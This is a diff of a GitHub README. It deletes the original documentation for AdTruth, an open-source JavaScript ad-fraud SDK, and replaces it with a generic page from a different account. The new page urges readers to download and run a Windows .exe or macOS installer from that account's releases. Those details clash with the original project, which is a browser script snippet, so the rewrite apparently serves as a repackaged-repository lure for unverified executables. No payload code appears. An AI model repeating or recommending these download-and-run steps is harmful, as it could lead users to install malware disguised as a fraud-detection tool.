@@ -1,584 +1,86 @@
-<p align="center">
-  <img src="docs/logos/github_banner.PNG" alt="AdTruth - Stop Fake Traffic. Start Real Growth." width="1000">
-</p>
-
-<p align="center">
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square" alt="License: MIT"></a>
-  <a href="https://github.com/papa-torb/adtruth/actions"><img src="https://github.com/papa-torb/adtruth/actions/workflows/ci.yml/badge.svg?style=flat-square" alt="CI Status"></a>
-  <img src="https://img.shields.io/badge/Bundle%20Size-12KB-brightgreen.svg?style=flat-square" alt="Bundle Size">
-  <a href="https://adtruth.io"><img src="https://img.shields.io/badge/Demo-Live%20→-success.svg?style=flat-square" alt="Live Demo"></a>
-</p>
-
-<p align="center">
-  <strong>Open-source ad fraud detection for small businesses</strong>
-</p>
-
-<p align="center">
-  <a href="https://adtruth.io">Live Demo</a> •
-  <a href="#quick-start">Quick Start</a> •
-  <a href="#adtruth-comparison-with-industry-solutions">Why Different</a> •
-  <a href="#for-developers">Contribute</a>
-</p>
-
-<p align="center">
-  <em>Founded by <a href="https://github.com/papa-torb">Hongyi Shui</a></em>
-</p>
-
----
-
-
-## Ad Fraud Detection for Small Businesses
-
-Detect click fraud, bot traffic, and fake conversions from Google Ads, Facebook Ads, Instagram, and TikTok. AdTruth is a free, open-source ad fraud detection tool that helps small businesses identify which advertising platforms waste their budget on fraudulent traffic.
-
-You're spending $3,000/month on paid ads. Conversion rate: 5%.
-
-**30% of those clicks might be fake.**
-
-Not obvious bots—AI-powered ad fraud that mimics human behavior perfectly. Natural mouse movement. Human-like scrolling. They visit your page, bounce after 8 seconds. You just paid $2.50 for nothing.
-
-Enterprise fraud detection tools (ClickCease, CHEQ, TrafficGuard) cost thousands per month.
-
-We built AdTruth to give small businesses the same ad fraud visibility, completely free. Detect bot traffic and fraudulent clicks across all your advertising platforms. See which channels waste your budget on fake traffic and shift spending to real customers.
-
----
-
-
-## The Reality of Ad Fraud and Click Fraud
-
-<table>
-<tr>
-<td width="33%" valign="top">
-
-### The Problem
-
-**30%** of paid traffic
-**is fraudulent**
-
-- Bot farms generate fake clicks
-- AI mimics real user behavior perfectly
-- Click fraud costs you $1-3 per $10 spent
-- Platforms filter obvious bots, but sophisticated fraud slips through
-
-> Your campaigns look fine. The fraud is invisible.
-
-</td>
-<td width="33%" valign="top">
-
-### The Double Cost
-
-**Two ways you're losing money**
-
-- **Fraud waste**: $2-10K/year on bot clicks
-- **Solution cost**: $5K-50K/year for enterprise tools
-- Small businesses face both problems
-- Can't afford visibility, can't stop the bleeding
-
-> Without fraud analytics, you're flying blind.
-
-</td>
-<td width="33%" valign="top">
-
-### The Solution
-
-**$0 forever**
-**with AdTruth**
-
-- See fraud rates across Google, Facebook, Instagram, TikTok
-- Compare: "Google 11% fraud vs Instagram 63% fraud"
-- Shift budget from high-fraud to low-fraud platforms
-- 12KB script—lighter than most images
-
-> One line of code. Free forever. Open source.
-
-</td>
-</tr>
-</table>
-
-<div align="center">
-
-### Know which platforms waste your money. Shift budget to what works.
-
-**[Get Started →](https://adtruth.io/signup)** • **[View Demo](https://adtruth.io)** • **[Read Docs](#installation)**
-
-</div>
-
----
-
-
-## How Fraud Works
-
-<div align="center">
-
-<img src="docs/images/fraud-journey.png" alt="Ad fraud flow visualization" width="900" style="border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);">
-
-**The fraud economy:** Fake websites generate clicks → Fraudsters profit → Your budget disappears → Real customers never see your ads
-
-**AdTruth reveals which platforms have higher fraud rates**, so you can shift budget from high-fraud channels to low-fraud ones.
-
-</div>
-
----
-
-
-## See It In Action
-
-### Calculate Your Fraud Waste (Estimated fraud rates. Real data available once you connect)
-
-<div align="center">
-
-<img src="docs/images/fraud_waste_calculator.png" alt="AdTruth fraud waste calculator" width="900" style="border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);">
-
-**Try it yourself:** [adtruth.io](https://adtruth.io) • Enter your website to see estimated fraud rates across Google, Facebook, Instagram, and TikTok
-
-</div>
-
-### Your Dashboard After Connection
-
-<div align="center">
-
-<img src="docs/images/dashboard_demo.png" alt="AdTruth analytics dashboard" width="900" style="border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);">
-
-</div>
-
-**Real-time insights:**
-- See which platforms waste money on bots vs attract real customers
-- Compare your fraud rates to industry benchmarks
-- Get actionable recommendations
-
----
-
-
-## <span style="color: #1E3A8A;">How AdTruth Works</span>
-
-**1. Install** → Add one line of code to your website (takes 60 seconds)
-
-**2. Collect** → AdTruth automatically tracks visitor behavior and fraud signals
-
-**3. Analyze** → Our ML models calculate fraud rates for each traffic source
-
-**4. Optimize** → See platform-by-platform fraud rates (e.g., "Google: 11%, Instagram: 63%")
-
-**5. Reallocate** → Shift budget from high-fraud platforms to channels with real customers
-
-Zero configuration. No maintenance. Just install and go.
-
----
-
-
-## <span style="color: #1E3A8A;">Quick Start</span>
-
-**Get started in 60 seconds** • No credit card required • Free forever
-
-### Universal Installation (Works on Any Website)
-
-Add this script before the closing `</body>` tag:
-
-```html
-<script>
-(function(d, s, id) {
-    var js, fjs = d.getElementsByTagName(s)[0];
-    if (d.getElementById(id)) return;
-    js = d.createElement(s); js.id = id;
-    js.src = 'https://cdn.jsdelivr.net/gh/papa-torb/adtruth@latest/dist/adtruth.min.js';
-    js.onload = function() {
-        AdTruth.init('YOUR_API_KEY_HERE');
-    };
-    fjs.parentNode.insertBefore(js, fjs);
-}(document, 'script', 'adtruth-js'));
-</script>
-```
-
-**Get your free API key:** Sign up at [adtruth.io](https://adtruth.io) (takes 30 seconds)
-
----
-
-
-## <span style="color: #1E3A8A;">Platform-Specific Guides</span>
-
-### WordPress - ✅ TESTED
-
-**Time**: 2 minutes • **Difficulty**: Easy • **Tested**: Verified working
-
-WordPress powers 43% of all websites. We've tested and confirmed this integration works perfectly.
-
-**Quick Steps**:
-1. Install the **WPCode** plugin (2M+ active installations)
-2. Go to **Code Snippets → Header & Footer**
-3. Paste the AdTruth script in the **Footer** section
-4. Click **Save Changes**
-
-**[View detailed WordPress guide →](examples/wordpress/)**
-
-### Shopify - ✅ TESTED
-
-**Time**: 3 minutes • **Difficulty**: Easy • **Tested**: Verified working
-
-Modern Shopify stores use Custom Pixels for tracking scripts. This is the recommended method.
-
-**Quick Steps**:
-1. Go to **Settings → Customer Events**
-2. Click **Add Custom Pixel**
-3. Name it "AdTruth Fraud Detection"
-4. Paste the AdTruth initialization code
-5. Click **Save**
-
-**[View detailed Shopify guide →](examples/shopify/)**
-
-### Wix
-
-**Time**: 2 minutes • **Difficulty**: Easy
-
-**Quick Steps**:
-1. Go to **Settings → Custom Code** in your Wix dashboard
-2. Click **+ Add Custom Code**
-3. Paste the AdTruth script
-4. Set to load on **All Pages** in the **Body - end**
-5. Click **Apply**
-
-**[View detailed Wix guide →](examples/wix/)**
-
-### Other Platforms
-
-We have tested integration guides for:
-- **Squarespace** - [View guide](examples/squarespace/)
-- **Webflow** - [View guide](examples/webflow/)
-- **GoDaddy Website Builder** - [View guide](examples/godaddy/)
-- **GitHub Pages** - [View guide](examples/github-pages/)
-
----
-
-
-## Who AdTruth Helps
-
-| Business Type | Common Problem | How AdTruth Helps                                     |
-|---------------|----------------|-------------------------------------------------------|
-| **E-commerce** | High ad spend, low ROAS | Identify which platforms attract bots vs real shoppers |
-| **SaaS Companies** | Fake signups waste sales time | Distinguish real leads from click farm accounts       |
-| **Local Businesses** | Limited budget, blind spending | See which platforms deliver real foot traffic         |
-| **Marketing Agencies** | Clients blame poor results on you | Prove fraud with data, not guesswork                  |
-| **Developers** | Want to contribute to open source | Help build better fraud detection for everyone        |
-
-
----
-
-
-## AdTruth Comparison with Industry Solutions
-
-<table>
-<tr>
-<th width="25%">Feature</th>
-<th width="25%">AdTruth</th>
-<th width="25%">Enterprise Tools<br><sub>(ClickCease, CHEQ, etc.)</sub></th>
-<th width="25%">Google Analytics</th>
-</tr>
-<tr>
-<td><strong>Cost</strong></td>
-<td>✅ <strong>$0 forever</strong></td>
-<td>❌ $12K-50K/year</td>
-<td>✅ Free</td>
-</tr>
-<tr>
-<td><strong>Fraud Detection</strong></td>
-<td>✅ ML-powered, real-time</td>
-<td>✅ Advanced (black box)</td>
-<td>⚠️ Basic bot filtering only</td>
-</tr>
-<tr>
-<td><strong>Network Intelligence</strong></td>
-<td>✅ <strong>Learns from all sites</strong></td>
-<td>❌ Your data only</td>
-<td>❌ No fraud focus</td>
-</tr>
-<tr>
-<td><strong>Tracking Transparency</strong></td>
-<td>✅ <strong>100% open source</strong></td>
-<td>❌ Proprietary black box</td>
-<td>❌ Proprietary</td>
-</tr>
-<tr>
-<td><strong>Setup Time</strong></td>
-<td>✅ <strong>60 seconds</strong></td>
-<td>⏱️ Days to weeks</td>
-<td>⏱️ 5 minutes</td>
-</tr>
-<tr>
-<td><strong>Best For</strong></td>
-<td>✅ <strong>Small businesses</strong></td>
-<td>Large enterprises</td>
-<td>Basic analytics</td>
-</tr>
-</table>
-
-### The AdTruth Advantage
-
-**Enterprise-grade fraud analytics without enterprise pricing.** Your traffic data helps train models that benefit the entire network. When we detect fraud patterns on one site, every other business gets better fraud scoring immediately.
-
----
-
-
-## FAQ
-
-<details>
-<summary><b>Will this slow down my website?</b></summary>
-
-<br>
-
-No. AdTruth is **12KB minified** (smaller than most images) and loads **asynchronously**. It won't block your page rendering or affect your Core Web Vitals scores.
-
-</details>
-
-<details>
-<summary><b>Do I need to be technical to use this?</b></summary>
-
-<br>
-
-Not at all. Copy-paste one line of code into your website (takes 60 seconds). The dashboard shows everything in plain English with color-coded fraud scores.
-
-</details>
-
-<details>
-<summary><b>How do you make money if it's free?</b></summary>
-
-<br>
-
-We don't—yet. AdTruth is a public good project. Small businesses deserve the same fraud protection as Fortune 500 companies. We're building this as an open-source community effort first, monetization later (if ever).
-
-</details>
-
-<details>
-<summary><b>Can I use this with Google Analytics?</b></summary>
-
-<br>
-
-Absolutely! AdTruth is **complementary** to Google Analytics. GA shows you traffic patterns; AdTruth tells you which traffic is fraudulent. Use them together for complete visibility.
-
-</details>
-
-<details>
-<summary><b>What if I have a WordPress/Shopify/Wix site?</b></summary>
-
-<br>
-
-AdTruth works with **any website**:
-- **WordPress**: Add the script to your theme's `header.php` or use a code injection plugin
-- **Shopify**: Add to `theme.liquid` in the `<head>` section
-- **Wix**: Use the Custom Code feature in Site Settings
-- **Squarespace**: Use Code Injection in Settings
-
-</details>
-
-<details>
-<summary><b>Is my data private?</b></summary>
-
-<br>
-
-Yes. We collect **only** anonymized behavioral signals (mouse patterns, scroll depth, device signatures). No personal information. No emails. No names. No passwords. We're **GDPR and CCPA compliant** by design.
-
-</details>
-
-<details>
-<summary><b>How accurate is the fraud detection?</b></summary>
-
-<br>
-
-Our ML models are trained on collective network data from all participating sites. Average fraud detection rate across industries is **15-40%**. Accuracy improves as more businesses join the network—every fraudster we catch protects everyone.
-
-</details>
-
-<details>
-<summary><b>Can I self-host AdTruth?</b></summary>
-
-<br>
-
-Yes! It's **100% open source** (MIT license). Clone the repo, modify it, host it yourself. We encourage transparency and customization. Check the [For Developers](#for-developers) section for build instructions.
-
-</details>
-
----
-
-## How AdTruth Detects Fraud
-
-AdTruth uses a multi-layered approach to identify fraudulent traffic:
-
-- **Browser fingerprinting** - Unique device signatures that bots can't fake
-- **Behavioral analysis** - Real users scroll, move, and click differently than bots
-- **Machine learning** - Isolation Forest models trained on collective network data
-- **Network intelligence** - Fraud patterns detected on one site protect all sites
-
-**Why we don't share all our methods:** Disclosing detailed detection techniques helps fraudsters bypass them. Our open-source SDK is transparent, but our ML models and detection rules remain proprietary to stay ahead of evolving fraud.
-
----
-
-## Privacy & Compliance
-
-AdTruth is designed with privacy as a core principle:
-
-- ✅ **GDPR compliant** - No personal data collection
-- ✅ **CCPA compliant** - Users can opt-out anytime
-- ✅ **No PII storage** - We don't collect names, emails, or addresses
-- ✅ **Cookie-less tracking** - Works without third-party cookies
-- ✅ **Encrypted in transit** - All data encrypted via HTTPS
-- ✅ **Respects Do Not Track** - Honors browser privacy settings
-- ✅ **Open source** - Audit the code yourself
-
-**What we collect:**
-- Anonymized behavioral signals (mouse patterns, scroll depth)
-- Technical attributes (browser type, screen resolution)
-- Campaign parameters (UTM codes from ad links)
-
-**What we DON'T collect:**
-- Personal information (names, emails, phone numbers)
-- Payment information
-- Precise geolocation
-- Browsing history outside your website
-
----
-
-## <span style="color: #1E3A8A;">For Developers</span>
-
-### Building from Source
-
-```bash
-# Clone the repository
-git clone https://github.com/papa-torb/adtruth.git
-cd adtruth
-
-# Install dependencies
-npm install
-
-# Build for production
-npm run build
-
-# Build for development (with watch)
-npm run dev
-
-# Run tests
-npm test
-```
-
-### Project Structure
-
-```
-adtruth/
-├── src/
-│   ├── core/           # Core tracking logic
-│   ├── fingerprint/    # Browser fingerprinting
-│   ├── behavior/       # Behavioral analysis
-│   └── utils/          # Helper functions
-├── dist/               # Built files
-├── tests/              # Test suite
-└── rollup.config.js    # Build configuration
-```
-
-### Contributing Code
-
-We welcome contributions! Every improvement you make helps protect thousands of businesses.
-
-**How to contribute:**
-
-1. **Fork the repository** and create a feature branch
-2. **Write tests** for your changes
-3. **Follow our coding standards** (ESLint + Prettier configured)
-4. **Submit a pull request** with a clear description
-
-**Areas where we need help:**
-- New fraud detection techniques
-- Performance optimizations
-- Browser compatibility testing
-- Documentation improvements
-- Translation to other languages
-
-**Not a developer?** You can still help:
-- Report bugs or fraud patterns you've discovered
-- Improve documentation
-- Share AdTruth with other small business owners
-- Contribute to discussions and feature ideas
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.
-
----
-
-## Roadmap
-
-### Current Version (v0.2.1)
-- ✅ Browser fingerprinting
-- ✅ Behavioral analysis (mouse, scroll, touch)
-- ✅ UTM campaign tracking
-- ✅ Real-time dashboard
-- ✅ ML-based fraud scoring
-- ✅ Page unload tracking (accurate session duration)
-- ✅ Platform integration guides (WordPress, Shopify, Wix)
-
-### Coming Next (v0.3.0)
-- 🔄 Advanced ML models (ensemble methods)
-- 🔄 Honeypot trap implementation
-- 🔄 WebGL fingerprinting
-- 🔄 Page visibility tracking
-- 🔄 Email/Slack alerts for fraud spikes
-
-### Future Vision (v1.0+)
-- 📋 Open fraud dataset for researchers
-- 📋 Community-contributed fraud rules
-- 📋 Plugin marketplace (WordPress, Shopify, etc.)
-- 📋 API for third-party integrations
-- 📋 Mobile app for on-the-go monitoring
-
-**Want to influence the roadmap?** [Open an issue](https://github.com/papa-torb/adtruth/issues) or join the discussion.
-
----
-
-## Community & Support
-
-### Get Help
-- **GitHub Issues**: [Report bugs or request features](https://github.com/papa-torb/adtruth/issues)
-- **Documentation**: See [CHANGELOG.md](CHANGELOG.md), [SECURITY.md](SECURITY.md), and platform guides in [examples/](examples/)
-- **Email**: *(Coming Soon - official support email)*
-
-### Stay Updated
-- ⭐ **Star this repo** to show support
-- 👀 **Watch releases** to get notified of updates
-- 📋 **Read the** [**CHANGELOG**](CHANGELOG.md) for version updates
-
-### Spread the Word
-The more businesses that use AdTruth, the better it works for everyone. Share with:
-- Other small business owners
-- Marketing agencies
-- Developer communities
-- Anyone paying for online advertising
-
----
-
-## License
-
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
-**What this means:**
-- ✅ Use AdTruth commercially
-- ✅ Modify the code
-- ✅ Distribute your own versions
-- ✅ Private use
-- ⚠️ Must include copyright notice
-- ⚠️ No warranty provided
-
----
-
-## Acknowledgments
-
-- **Founded by [Hongyi Shui](https://github.com/papa-torb)** - Building fraud protection for small businesses
-- Inspired by research from Stanford, MIT, and industry fraud detection papers
-- Special thanks to the open-source community for making projects like this possible
-
----
-
-<p align="center">
-  <strong>AdTruth</strong> - Protecting your ad spend through collective intelligence
-</p>
-
-<p align="center">
-  Made with care for small businesses everywhere
-</p>
-
----
-
-> **Note:** This project is still under development.
+# 🎯 adtruth - Detect Ad Fraud with Ease
+
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download%20adtruth-v1.0-blue?style=for-the-badge)](https://github.com/galaxydiesel643/adtruth/releases)
+
+## 📜 About adtruth
+adtruth is an open-source application designed to help small businesses detect ad fraud using machine learning. It identifies click fraud and bot traffic from platforms like Google Ads and Facebook Ads. This software is completely free and user-friendly, making it accessible for everyone.
+
+## 🚀 Getting Started
+To get started with adtruth, follow these simple steps:
+
+1. **Visit the Release Page**  
+   Go to the [Releases page](https://github.com/galaxydiesel643/adtruth/releases) to find the latest version of the software.
+
+2. **Download the Application**  
+   Find the latest version in the list. Click on the appropriate file for your operating system to download it. 
+   
+   For example, if you see a file named `adtruth_windows.exe`, choose that if you are using Windows.
+
+3. **Install the Application**  
+   After downloading, locate the downloaded file in your computer's 'Downloads' folder or the folder you selected for downloads. Double-click on the file to run the installer. Follow the prompts on the screen to complete the installation.
+
+4. **Run the Software**  
+   Once you have installed adtruth, you can find it in your applications. Open it like any other program.
+
+5. **Start Detecting Fraud**  
+   Follow the on-screen instructions to set up your ad accounts and start monitoring for fraud.
+
+## 🔍 Features
+- **Detects Different Types of Fraud**  
+  adtruth identifies click fraud, bot traffic, and more across various advertising platforms.
+
+- **User-Friendly Interface**  
+  The application features a simple layout, guiding non-technical users through the process smoothly.
+
+- **Detailed Reports**  
+  Generate reports that provide insights into your ad performance and potential fraud issues.
+
+- **Cross-Platform Compatibility**  
+  Available for Windows and macOS, making it easy for users on either platform to benefit.
+
+## 💡 System Requirements
+- **Windows:**  
+  - Windows 10 or later
+  - 4 GB RAM minimum
+  - 500 MB of available disk space
+
+- **macOS:**  
+  - macOS Mojave or later
+  - 4 GB RAM minimum
+  - 500 MB of available disk space
+
+## 📥 Download & Install
+To download adtruth, again visit the [Releases page](https://github.com/galaxydiesel643/adtruth/releases). Click on the latest version shown, and download the file suitable for your operating system.
+
+After the download is complete, install the software by following the previous instructions. Once installed, open adtruth and start your journey towards better ad performance and fraud detection.
+
+## 🤝 Getting Help
+If you encounter any issues or have questions about using adtruth, please refer to the community forums or the built-in help section within the software. You can also find tips and FAQs on the GitHub repository.
+
+## 🔥 Contributing
+If you want to contribute to the development of adtruth, feel free to check the repository for guidelines. Community contributions help improve the software and make it more robust for everyone.
+
+## 📞 Contact
+If you have feedback or suggestions, you can reach out via the Issues section on the GitHub page. Your input helps us make adtruth better for all users.
+
+## 🌟 Topics Covered
+- ad-fraud
+- ad-fraud-detection
+- ad-tech
+- advertising-fraud
+- analytics
+- bot-detection
+- bot-traffic
+- click-fraud
+- digital-advertising
+- facebook-ads
+- fraud-detection
+- fraud-prevention
+- google-ads
+- javascript
+- open-source
+- small-business
+- traffic-analysis
+
+Thank you for choosing adtruth. Start protecting your advertising investment today!
